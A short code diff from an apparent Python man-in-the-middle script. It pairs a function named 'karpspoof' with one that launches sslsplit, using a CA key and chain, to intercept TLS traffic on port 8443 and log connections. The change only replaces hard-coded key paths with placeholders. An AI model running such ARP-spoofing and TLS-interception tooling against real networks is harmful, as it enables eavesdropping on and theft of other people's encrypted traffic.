@@ -25,7 +25,7 @@ def karpspoof():
         return spoofer
 
     def sslsplit():
-        splitter = Popen(["sslsplit", "-k", "/root/ca/intermediate/private/cf-intermediate.key.pem", "-c", "/root/ca/intermediate/certs/intermediate.cert.pem", "-C", "/root/ca/intermediate/certs/ca-chain.cert.pem", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
+        splitter = Popen(["sslsplit", "-k", "<INTERMEDIATE KEY>", "-c", "<INTERMEDIATE CERTIFICATE>", "-C", "<CA CHAIN>", "-L", "connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
         return splitter
 
     def read_output():
